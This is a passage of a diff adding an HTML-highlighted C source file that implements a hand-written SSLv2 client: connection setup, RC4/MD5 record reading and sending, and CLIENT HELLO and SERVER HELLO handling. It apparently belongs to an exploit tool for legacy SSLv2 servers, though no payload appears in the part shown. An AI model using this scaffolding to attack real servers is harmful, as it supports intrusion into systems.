+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;sock;<br>
+                <br>
+                s_in.sin_family&nbsp;=&nbsp;AF_INET;<br>
+                s_in.sin_addr.s_addr&nbsp;=&nbsp;getip(host);<br>
+                s_in.sin_port&nbsp;=&nbsp;htons(port);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((sock&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>))&nbsp;&lt;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Could&nbsp;not&nbsp;create&nbsp;a&nbsp;socket\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(connect(sock,&nbsp;(<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;sockaddr&nbsp;*)&amp;s_in,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(s_in))&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Connection&nbsp;to&nbsp;%s:%d&nbsp;failed:&nbsp;%s\n"</span>,&nbsp;host,&nbsp;port,&nbsp;strerror(errno));<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;sock;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Create&nbsp;a&nbsp;new&nbsp;ssl&nbsp;conn&nbsp;structure&nbsp;and&nbsp;connect&nbsp;to&nbsp;a&nbsp;host&nbsp;*/</span><br>
+                ssl_conn*&nbsp;ssl_connect_host(<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;host,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;port)<br>
+                {<br>
+                ssl_conn*&nbsp;ssl;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!(ssl&nbsp;=&nbsp;(ssl_conn*)&nbsp;malloc(<span style="color:#ff9d00;font-weight:700">sizeof</span>(ssl_conn))))&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Can't&nbsp;allocate&nbsp;memory\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Initialize&nbsp;some&nbsp;values&nbsp;*/</span><br>
+                ssl-&gt;encrypted&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                ssl-&gt;write_seq&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                ssl-&gt;read_seq&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                <br>
+                ssl-&gt;sock&nbsp;=&nbsp;connect_host(host,&nbsp;port);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;ssl;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;global&nbsp;buffer&nbsp;used&nbsp;by&nbsp;the&nbsp;ssl&nbsp;result()&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">char</span>&nbsp;res_buf[<span style="color:#ff0044;font-weight:400">30</span>];<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;converts&nbsp;an&nbsp;SSL&nbsp;error&nbsp;code&nbsp;to&nbsp;a&nbsp;string&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">char</span>*&nbsp;ssl_error(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;code)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">switch</span>&nbsp;(code)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x00</span>: <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SSL2&nbsp;PE&nbsp;UNDEFINED&nbsp;ERROR&nbsp;(0x00)"</span>;<br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x01</span>: <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SSL2&nbsp;PE&nbsp;NO&nbsp;CIPHER&nbsp;(0x01)"</span>;<br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x02</span>: <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SSL2&nbsp;PE&nbsp;NO&nbsp;CERTIFICATE&nbsp;(0x02)"</span>;<br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x04</span>: <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SSL2&nbsp;PE&nbsp;BAD&nbsp;CERTIFICATE&nbsp;(0x03)"</span>;<br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;<span style="color:#ff0044;font-weight:400">0x06</span>: <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SSL2&nbsp;PE&nbsp;UNSUPPORTED&nbsp;CERTIFICATE&nbsp;TYPE&nbsp;(0x06)"</span>;<br>
+                <span style="color:#ff9d00;font-weight:700">default</span>:<br>
+                sprintf(res_buf,&nbsp;<span style="color:#3ad900;font-weight:400">"%02x"</span>,&nbsp;code);<br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;res_buf;<br>
+                }<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;read&nbsp;len&nbsp;bytes&nbsp;from&nbsp;a&nbsp;socket.&nbsp;boring.&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;read_data(<span style="color:#7f0044;font-weight:400">int</span>&nbsp;sock,&nbsp;<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;buf,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;len)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;l;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;to_read&nbsp;=&nbsp;len;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">do</span>&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((l&nbsp;=&nbsp;read(sock,&nbsp;buf,&nbsp;to_read))&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Error&nbsp;in&nbsp;read:&nbsp;%s\n"</span>,&nbsp;strerror(errno));<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                to_read&nbsp;-=&nbsp;len;<br>
+                }&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>&nbsp;(to_read&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;len;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;reads&nbsp;an&nbsp;SSL&nbsp;packet&nbsp;and&nbsp;decrypts&nbsp;it&nbsp;if&nbsp;necessery&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;read_ssl_packet(ssl_conn*&nbsp;ssl,&nbsp;<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;buf,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;buf_size)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;rec_len,&nbsp;padding;<br>
+                <br>
+                read_data(ssl-&gt;sock,&nbsp;buf,&nbsp;<span style="color:#ff0044;font-weight:400">2</span>);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0x80</span>)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;three&nbsp;byte&nbsp;header&nbsp;*/</span><br>
+                rec_len&nbsp;=&nbsp;((buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0x3f</span>)&nbsp;&lt;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">8</span>)&nbsp;|&nbsp;buf[<span style="color:#ff0044;font-weight:400">1</span>];<br>
+                read_data(ssl-&gt;sock,&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">2</span>],&nbsp;<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                padding&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">int</span>)buf[<span style="color:#ff0044;font-weight:400">2</span>];<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;two&nbsp;byte&nbsp;header&nbsp;*/</span><br>
+                rec_len&nbsp;=&nbsp;((buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;&amp;&nbsp;<span style="color:#ff0044;font-weight:400">0x7f</span>)&nbsp;&lt;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">8</span>)&nbsp;|&nbsp;buf[<span style="color:#ff0044;font-weight:400">1</span>];<br>
+                padding&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((rec_len&nbsp;&lt;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;||&nbsp;(rec_len&nbsp;&gt;&nbsp;buf_size))&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"read_ssl_packet:&nbsp;Record&nbsp;length&nbsp;out&nbsp;of&nbsp;range&nbsp;(rec_len&nbsp;=&nbsp;%d)\n"</span>,&nbsp;rec_len);&nbsp;<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                read_data(ssl-&gt;sock,&nbsp;buf,&nbsp;rec_len);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(ssl-&gt;encrypted)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(MD5_DIGEST_LENGTH&nbsp;+&nbsp;padding&nbsp;&gt;=&nbsp;rec_len)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;==&nbsp;SSL2_MT_ERROR)&nbsp;&amp;&amp;&nbsp;(rec_len&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">3</span>))&nbsp;{<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;the&nbsp;server&nbsp;didn't&nbsp;switch&nbsp;to&nbsp;encryption&nbsp;due&nbsp;to&nbsp;an&nbsp;error&nbsp;*/</span><br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"read_ssl_packet:&nbsp;Encrypted&nbsp;message&nbsp;is&nbsp;too&nbsp;short&nbsp;(rec_len&nbsp;=&nbsp;%d)\n"</span>,&nbsp;rec_len);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;decrypt&nbsp;the&nbsp;encrypted&nbsp;part&nbsp;of&nbsp;the&nbsp;packet&nbsp;*/</span><br>
+                RC4(ssl-&gt;rc4_read_key,&nbsp;rec_len,&nbsp;buf,&nbsp;buf);<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;move&nbsp;the&nbsp;decrypted&nbsp;message&nbsp;in&nbsp;the&nbsp;beginning&nbsp;of&nbsp;the&nbsp;buffer&nbsp;*/</span><br>
+                rec_len&nbsp;=&nbsp;rec_len&nbsp;-&nbsp;MD5_DIGEST_LENGTH&nbsp;-&nbsp;padding;<br>
+                memmove(buf,&nbsp;buf&nbsp;+&nbsp;MD5_DIGEST_LENGTH,&nbsp;rec_len);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;==&nbsp;SSL2_MT_ERROR)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(rec_len&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">3</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Malformed&nbsp;server&nbsp;error&nbsp;message\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                }<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">return</span>&nbsp;rec_len;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;send&nbsp;an&nbsp;ssl&nbsp;packet,&nbsp;encrypting&nbsp;it&nbsp;if&nbsp;ssl-&gt;encrypted&nbsp;is&nbsp;set&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;send_ssl_packet(ssl_conn*&nbsp;ssl,&nbsp;<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;rec,&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;rec_len)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE];<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>*&nbsp;p;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;tot_len;<br>
+                MD5_CTX&nbsp;ctx;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;seq;<br>
+                <br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(ssl-&gt;encrypted)<br>
+                tot_len&nbsp;=&nbsp;rec_len&nbsp;+&nbsp;MD5_DIGEST_LENGTH; <span style="color:#0088ff;font-weight:400">/*&nbsp;RC4&nbsp;needs&nbsp;no&nbsp;padding&nbsp;*/</span><br>
+                <span style="color:#ff9d00;font-weight:700">else</span><br>
+                tot_len&nbsp;=&nbsp;rec_len;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(<span style="color:#ff0044;font-weight:400">2</span>&nbsp;+&nbsp;tot_len&nbsp;&gt;&nbsp;BUFSIZE)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"send_ssl_packet:&nbsp;Record&nbsp;length&nbsp;out&nbsp;of&nbsp;range&nbsp;(rec_len&nbsp;=&nbsp;%d)\n"</span>,&nbsp;rec_len);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                p&nbsp;=&nbsp;buf;<br>
+                s2n(tot_len,&nbsp;p);<br>
+                <br>
+                buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;=&nbsp;buf[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;|&nbsp;<span style="color:#ff0044;font-weight:400">0x80</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;two&nbsp;byte&nbsp;header&nbsp;*/</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(ssl-&gt;encrypted)&nbsp;{<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;calculate&nbsp;the&nbsp;MAC&nbsp;*/</span><br>
+                seq&nbsp;=&nbsp;ntohl(ssl-&gt;write_seq);<br>
+                <br>
+                MD5_Init(&amp;ctx);<br>
+                MD5_Update(&amp;ctx,&nbsp;ssl-&gt;write_key,&nbsp;RC4_KEY_LENGTH);<br>
+                MD5_Update(&amp;ctx,&nbsp;rec,&nbsp;rec_len);<br>
+                MD5_Update(&amp;ctx,&nbsp;&amp;seq,&nbsp;<span style="color:#ff0044;font-weight:400">4</span>);<br>
+                MD5_Final(p,&nbsp;&amp;ctx);<br>
+                <br>
+                p+=MD5_DIGEST_LENGTH;<br>
+                <br>
+                memcpy(p,&nbsp;rec,&nbsp;rec_len);<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;encrypt&nbsp;the&nbsp;payload&nbsp;*/</span><br>
+                RC4(ssl-&gt;rc4_write_key,&nbsp;tot_len,&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">2</span>],&nbsp;&amp;buf[<span style="color:#ff0044;font-weight:400">2</span>]);<br>
+                <br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br>
+                memcpy(p,&nbsp;rec,&nbsp;rec_len);<br>
+                }<br>
+                <br>
+                send(ssl-&gt;sock,&nbsp;buf,&nbsp;<span style="color:#ff0044;font-weight:400">2</span>&nbsp;+&nbsp;tot_len,&nbsp;<span style="color:#ff0044;font-weight:400">0</span>);<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;the&nbsp;sequence&nbsp;number&nbsp;is&nbsp;incremented&nbsp;by&nbsp;both&nbsp;encrypted&nbsp;and&nbsp;plaintext&nbsp;packets<br>
+                */</span><br>
+                ssl-&gt;write_seq++;<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Send&nbsp;a&nbsp;CLIENT&nbsp;HELLO&nbsp;message&nbsp;to&nbsp;the&nbsp;server&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;send_client_hello(ssl_conn&nbsp;*ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;i;<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE]&nbsp;=<br>
+                <span style="color:#3ad900;font-weight:400">"\x01"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;client&nbsp;hello&nbsp;msg&nbsp;*/</span><br>
+                <br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x02"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;client&nbsp;version&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x18"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;cipher&nbsp;specs&nbsp;length&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;session&nbsp;id&nbsp;length&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x10"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;challenge&nbsp;length&nbsp;*/</span><br>
+                <br>
+                <span style="color:#3ad900;font-weight:400">"\x07\x00\xc0\x05\x00\x80\x03\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;cipher&nbsp;specs&nbsp;data&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x80\x01\x00\x80\x08\x00\x80\x06"</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x40\x04\x00\x80\x02\x00\x80"</span><br>
+                <br>
+                <span style="color:#3ad900;font-weight:400">""</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;session&nbsp;id&nbsp;data&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;generate&nbsp;CHALLENGE&nbsp;LENGTH&nbsp;bytes&nbsp;of&nbsp;challenge&nbsp;data&nbsp;*/</span><br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(i&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;&nbsp;i&nbsp;&lt;&nbsp;CHALLENGE_LENGTH;&nbsp;i++)&nbsp;{<br>
+                ssl-&gt;challenge[i]&nbsp;=&nbsp;(<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>)&nbsp;(rand()&nbsp;&gt;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">24</span>);<br>
+                }<br>
+                memcpy(&amp;buf[<span style="color:#ff0044;font-weight:400">33</span>],&nbsp;ssl-&gt;challenge,&nbsp;CHALLENGE_LENGTH);<br>
+                <br>
+                send_ssl_packet(ssl,&nbsp;buf,&nbsp;<span style="color:#ff0044;font-weight:400">33</span>&nbsp;+&nbsp;CHALLENGE_LENGTH);<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;Get&nbsp;a&nbsp;SERVER&nbsp;HELLO&nbsp;response&nbsp;from&nbsp;the&nbsp;server&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:400">void</span>&nbsp;get_server_hello(ssl_conn*&nbsp;ssl)<br>
+                {<br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;buf[BUFSIZE];<br>
+                <span style="color:#7f0044;font-weight:400">const</span>&nbsp;<span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;*p,&nbsp;*end;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;len;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;server_version,&nbsp;cert_length,&nbsp;cs_length,&nbsp;conn_id_length;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;found;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!(len&nbsp;=&nbsp;read_ssl_packet(ssl,&nbsp;buf,&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(buf))))&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"Server&nbsp;error:&nbsp;%s\n"</span>,&nbsp;ssl_error(ntohs(*(uint16_t*)&amp;buf[<span style="color:#ff0044;font-weight:400">1</span>])));<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(len&nbsp;&lt;&nbsp;<span style="color:#ff0044;font-weight:400">11</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get_server_hello:&nbsp;Packet&nbsp;too&nbsp;short&nbsp;(len&nbsp;=&nbsp;%d)\n"</span>,&nbsp;len);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                p&nbsp;=&nbsp;buf;<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(*(p++)&nbsp;!=&nbsp;SSL2_MT_SERVER_HELLO)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get_server_hello:&nbsp;Expected&nbsp;SSL2&nbsp;MT&nbsp;SERVER&nbsp;HELLO,&nbsp;got&nbsp;%x\n"</span>,&nbsp;(<span style="color:#7f0044;font-weight:400">int</span>)p[-<span style="color:#ff0044;font-weight:400">1</span>]);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(*(p++)&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get_server_hello:&nbsp;SESSION-ID-HIT&nbsp;is&nbsp;not&nbsp;0\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(*(p++)&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get_server_hello:&nbsp;CERTIFICATE-TYPE&nbsp;is&nbsp;not&nbsp;SSL&nbsp;CT&nbsp;X509&nbsp;CERTIFICATE\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                n2s(p,&nbsp;server_version);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(server_version&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">2</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get_server_hello:&nbsp;Unsupported&nbsp;server&nbsp;version&nbsp;%d\n"</span>,&nbsp;server_version);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                n2s(p,&nbsp;cert_length);<br>
+                n2s(p,&nbsp;cs_length);<br>
+                n2s(p,&nbsp;conn_id_length);<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(len&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">11</span>&nbsp;+&nbsp;cert_length&nbsp;+&nbsp;cs_length&nbsp;+&nbsp;conn_id_length)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get_server_hello:&nbsp;Malformed&nbsp;packet&nbsp;size\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;read&nbsp;the&nbsp;server&nbsp;certificate&nbsp;*/</span><br>
+                ssl-&gt;x509&nbsp;=&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>;<br>
+                ssl-&gt;x509=d2i_X509(<span style="color:#0088ff;font-weight:700">NULL</span>,&amp;p,(<span style="color:#7f0044;font-weight:400">long</span>)cert_length);<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(ssl-&gt;x509&nbsp;==&nbsp;<span style="color:#0088ff;font-weight:700">NULL</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;hello:&nbsp;Cannot&nbsp;parse&nbsp;x509&nbsp;certificate\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(cs_length&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">3</span>&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;hello:&nbsp;CIPHER-SPECS-LENGTH&nbsp;is&nbsp;not&nbsp;a&nbsp;multiple&nbsp;of&nbsp;3\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                found&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>;<br>
+                <span style="color:#ff9d00;font-weight:700">for</span>&nbsp;(end=p+cs_length;&nbsp;p&nbsp;&lt;&nbsp;end;&nbsp;p&nbsp;+=&nbsp;<span style="color:#ff0044;font-weight:400">3</span>)&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;((p[<span style="color:#ff0044;font-weight:400">0</span>]&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0x01</span>)&nbsp;&amp;&amp;&nbsp;(p[<span style="color:#ff0044;font-weight:400">1</span>]&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0x00</span>)&nbsp;&amp;&amp;&nbsp;(p[<span style="color:#ff0044;font-weight:400">2</span>]&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0x80</span>))<br>
+                found&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">1</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;SSL&nbsp;CK&nbsp;RC4&nbsp;128&nbsp;WITH&nbsp;MD5&nbsp;*/</span><br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(!found)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;hello:&nbsp;Remote&nbsp;server&nbsp;does&nbsp;not&nbsp;support&nbsp;128&nbsp;bit&nbsp;RC4\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(conn_id_length&nbsp;&gt;&nbsp;SSL2_MAX_CONNECTION_ID_LENGTH)&nbsp;{<br>
+                printf(<span style="color:#3ad900;font-weight:400">"get&nbsp;server&nbsp;hello:&nbsp;CONNECTION-ID-LENGTH&nbsp;is&nbsp;too&nbsp;long\n"</span>);<br>
+                exit(<span style="color:#ff0044;font-weight:400">1</span>);<br>
+                }<br>
+                <br>
